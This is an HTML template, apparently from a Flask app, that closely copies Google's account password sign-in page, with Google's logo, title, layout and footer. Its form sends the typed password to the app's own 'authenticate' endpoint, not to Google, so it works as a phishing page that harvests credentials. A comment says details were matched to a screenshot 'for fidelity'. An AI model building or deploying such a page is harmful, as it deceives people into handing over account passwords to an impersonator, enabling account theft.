<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='static/style.css') }}">
    <link rel="icon" href="{{ url_for('static', filename='assets/google_g_48dp.png') }}" type="image/png">
</head>
<body>
    <div class="container">
        <div class="card">
            <img src="{{ url_for('static', filename='assets/google_g_48dp.png') }}" alt="Google" class="google-logo">
            <h1>Hi {{ username }}</h1>
            
            <div class="email-display">
                <img src="https://ssl.gstatic.com/images/branding/avatar/1x/avatar_small_grey_60dp.png" alt="User Icon" class="user-icon">
                <span>{{ username }}</span>
                <span class="dropdown-arrow">&#9662;</span>
            </div>

            <form action="{{ url_for('authenticate') }}" method="POST">
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder="Enter your password" required autofocus>
                    <label for="password">Enter your password</label>
                </div>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="show-password" onchange="togglePasswordVisibility()">
                    <label for="show-password">Show password</label>
                </div>

                <a href="#" class="forgot-link">Forgot password?</a>

                <div class="button-group">
                    <!-- This button isn't present in the screenshot, but often appears. Leaving it out for fidelity. -->
                    <!-- <a href="#" class="create-account-link">Try another way</a> -->
                    <button type="submit" class="button primary">Next</button>
                </div>
            </form>
        </div>

        <div class="footer">
            <div class="dropdown">
                <span>English (United States)</span> &#9662;
            </div>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
    <script src="{{ url_for('static', filename='static/script.js') }}"></script>
</body>
</html>
